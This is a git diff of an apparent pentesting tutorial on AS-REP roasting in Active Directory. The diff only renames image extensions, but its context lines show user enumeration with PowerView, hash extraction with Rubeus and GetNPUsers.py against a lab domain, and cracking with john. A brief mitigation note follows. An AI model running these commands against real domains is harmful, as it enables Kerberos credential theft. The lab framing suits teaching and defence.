@@ -39,13 +39,13 @@ SPN: Service Principal Name  #The name of a service on the network
 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
 ```
 
-<img src="/img/asrep/enum.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/enum.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ```
 Get-DomainUser -PreauthNotRequired -verbose| select name
 ```
 
-<img src="/img/asrep/enum1.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/enum1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## ASREP Roasting with Impacket
 
@@ -60,7 +60,7 @@ saved the extracted hash in the john crackable format inside a text file
 Rubeus.exe asreproast /format:john /outfile:hash.txt
 ```
 
-<img src="/img/asrep/save.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/save.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## ASREP Roasting with ASREPRoast PowerShell Script
 
@@ -73,21 +73,21 @@ Rubeus.exe asreproast /format:john /outfile:hash.txt
 Import-Module .\powerview.ps1
 Get-DomainUser | select name
 ```
-<img src="/img/asrep/users.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/users.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-<img src="/img/asrep/users1.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/users1.PNG" alt="Getting-gz" width="1000" height="200"> 
  
 ```
 python3 GetNPUsers.py karim.net/ -usersfile  users.txt -dc-ip 192.168.128.140
 ```
 
-<img src="/img/asrep/users10.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/users10.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ```
 python3 GetNPUsers.py karim.net/asrepuser -dc-ip 192.168.128.140
 ```
 
-<img src="/img/asrep/kali.png" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/kali.PNG" alt="Getting-gz" width="1000" height="200"> 
  
 ## crack hash with john
  
@@ -95,7 +95,7 @@ python3 GetNPUsers.py karim.net/asrepuser -dc-ip 192.168.128.140
 john tgt.txt -w=/usr/share/wordlists/rockyou.txt
 ```
 
-<img src="/img/asrep/crack.ng" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/asrep/crack.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## AS-REP roasting Mitigation
 * ensure that no users within the Active Directory domain have Pre-authentication disabled (it is enabled by default).
